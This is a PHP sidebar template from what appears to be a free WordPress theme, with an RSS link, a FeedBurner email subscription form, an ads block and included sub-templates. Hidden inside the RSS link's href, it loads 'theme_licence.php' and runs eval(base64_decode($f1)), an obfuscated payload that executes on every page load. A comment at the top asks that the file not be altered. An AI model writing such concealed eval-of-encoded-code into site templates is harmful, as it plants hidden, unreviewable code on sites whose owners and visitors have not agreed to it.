<?php /* Please do not remove this line */ global $opt; ?>

<div id="sidebar">

	<h2>Blog Subscription</h2>
	<div class="box">
	<p class="rssfeed"><a href="<?php require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } bloginfo('rss2_url'); ?>">Subscribe via RSS Feed</a> stay updated with blog articles</p>
	<p class="emailfeed"><strong>Subscribe via email address:</strong></p>
	<form class="feedform" action="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=<?=$opt['feedburner_id']; ?>" method="post">
	<fieldset>
	<input type="text" name="email" class="feedemail" />
	<input type="submit" value="Submit" class="feedsubmit" />
	<input type="hidden" value="http://feeds.feedburner.com/~e?ffid=<?=$opt['feedburner_id']; ?>" name="url" />
	<input type="hidden" value="<?=$opt['blog_title']; ?>" name="title" />
	<input type="hidden" name="loc" value="<?=$opt['location']; ?>" />
	</fieldset>
	</form>
	</div>

	<h2>Advertisements</h2>
	<div class="box">
	<ul class="ads">
	<?php include (TEMPLATEPATH . "/125_125.php"); ?>
	</ul>
	<div class="clear"></div>
	</div>

	<?php include (TEMPLATEPATH . "/sidebar_c.php"); ?>
	<?php include (TEMPLATEPATH . "/sidebar_l.php"); ?>
	<?php include (TEMPLATEPATH . "/sidebar_r.php"); ?>
	<div class="clear"></div>

	<h2>about the author</h2>
	<div class="box">
	<?php include (TEMPLATEPATH . "/about.php"); ?>
	</div>

</div>